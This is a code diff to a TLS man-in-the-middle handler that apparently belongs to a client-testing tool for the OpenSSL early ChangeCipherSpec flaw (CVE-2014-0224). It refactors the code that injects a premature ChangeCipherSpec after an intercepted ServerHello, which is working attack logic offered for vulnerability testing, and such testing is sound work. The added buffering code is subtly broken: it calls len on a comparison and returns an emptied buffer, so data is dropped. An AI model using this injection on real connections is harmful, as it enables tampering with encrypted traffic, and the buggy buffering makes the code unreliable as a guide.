@@ -29,6 +29,7 @@ class EarlyCCS(LoggingHandler):
     description = "Tests for OpenSSL early CCS vulnerability(CVE-2014-0224)"
     injected_server = False
     bridge = False
+    buffer = ""
 
     def on_ssl(self, hello):
         self.ssl = True
@@ -36,40 +37,30 @@ class EarlyCCS(LoggingHandler):
         return False
 
     def on_request(self, request):
-        if not self.ssl or self.bridge:
+        if not self.ssl or self.bridge or not self.injected_server:
             return request
         try:
+            record, size = tls.types.TlsRecord.from_stream(request)
+            message = record.messages[0]
             if self.injected_server:
-                record, size = tls.types.TlsRecord.from_stream(request)
-                message = record.messages[0]
-                if self.injected_server:
-                    # OpenSSL after the EarlyCCS fix should send an unexpcted
-                    # message error. Some other libraries send a close_notify so
-                    # accept that as well.
-                    if not (
-                        isinstance(message, tls.types.Alert) and ((message.description == 10 and
-                            message.level == 2) or message.description == 0)):
-                        self.log(
-                            logging.CRITICAL,
-                            "Client is vulnerable to Early CCS attack!")
-                        self.connection.vuln_notify(util.vuln.VULN_EARLY_CCS)
-                        self.log_event(
-                            logging.CRITICAL,
-                            connection.AttackEvent(
-                                self.connection,
-                                self.name, True, None))
+                # OpenSSL after the EarlyCCS fix should send an unexpcted
+                # message error. Some other libraries send a close_notify so
+                # accept that as well.
+                if not (
+                    isinstance(message, tls.types.Alert) and ((message.description == 10 and
+                        message.level == 2) or message.description == 0)):
+                    self.log(
+                        logging.CRITICAL,
+                        "Client is vulnerable to Early CCS attack!")
+                    self.connection.vuln_notify(util.vuln.VULN_EARLY_CCS)
+                    self.log_attack_event()
 
-                        self.connection.close()
-                        self.bridge = True
-                    else:
-                        self.log(
-                            logging.DEBUG,
-                            "Client not vulnerable to early CCS")
-                        self.log_event(
-                            logging.INFO,
-                            connection.AttackEvent(
-                                self.connection,
-                                self.name, False, None))
+                    self.connection.close()
+                else:
+                    self.log(
+                        logging.DEBUG,
+                        "Client not vulnerable to early CCS")
+                    self.log_attack_event(success=False)
 
         except ValueError:
             # Failed to parse TLS, this is probably due to a short read of a TLS
@@ -77,39 +68,61 @@ class EarlyCCS(LoggingHandler):
             pass
         return request
 
+    def _inject_ccs(self, record, hello_message_index):
+        """Inject an early CCS while preserving the rest of the data."""
+        version = record.version
+        server_hello = record.messages[hello_message_index].obj
+        # Remove session id and extensions to prevent resumption
+        # Otherwise a CCS will follow a ServerHello normally
+        server_hello.extension_list = []
+        server_hello.session_id = []
+
+        ccs = tls.types.TlsRecord(
+            20, version,
+            [tls.types.ChangeCipherSpec(1)])
+
+        rec = tls.types.TlsRecord(22, version, record.messages[:hello_message_index + 1])
+
+        # Split the record if there are more messages after the ServerHello.
+        remaining = record.messages[hello_message_index + 1:]
+        if remaining:
+            rest = tls.types.TlsRecord(22, version, remaining).to_bytes()
+        else:
+            rest = ""
+
+        return rec.to_bytes() + ccs.to_bytes() + rest
+
+
+
     def on_response(self, response):
         if not self.ssl or self.bridge or self.injected_server:
             return response
+        response = self.buffer + response
+        self.buffer = ""
         try:
             index = 0
             while index < len(response):
                 record, size = tls.types.TlsRecord.from_stream(response[index:])
-                index += size
                 version = record.version
                 for i, message in enumerate(record.messages):
                     # Inject the CCS right after the ServerHello
                     if isinstance(message, tls.types.HandshakeMessage) and message.type == 2:
-                        server_hello = message.obj
-                        # Remove session id and extensions to prevent resumption
-                        # Otherwise a CCS will follow a ServerHello
-                        server_hello.extension_list = []
-                        server_hello.session_id = []
-
-                        ccs = tls.types.TlsRecord(
-                            20, record.version,
-                            [tls.types.ChangeCipherSpec(1)])
-                        rec = tls.types.TlsRecord(22, record.version, [message])
-                        done = tls.types.TlsRecord(
-                            22, record.version,
-                            [tls.types.ServerHelloDone()])
-                        response = (
-                            rec.to_bytes() + ccs.to_bytes() + done.to_bytes())
+                        response = (response[:index] +
+                                self._inject_ccs(record, i) +
+                                response[index+size:])
                         self.injected_server = True
-
                         return response
+
+                index += size
 
         except ValueError:
             # Failed to parse TLS, this is probably due to a short read of a TLS
-            # record.
-            pass
+            # record. Buffer the response to try and get more data.
+            self.buffer = response
+            # But don't buffer too much, give up after 16k.
+            if len(self.buffer > 2**14):
+                response = self.buffer
+                self.buffer = ""
+                return self.buffer
+            return ""
         return response
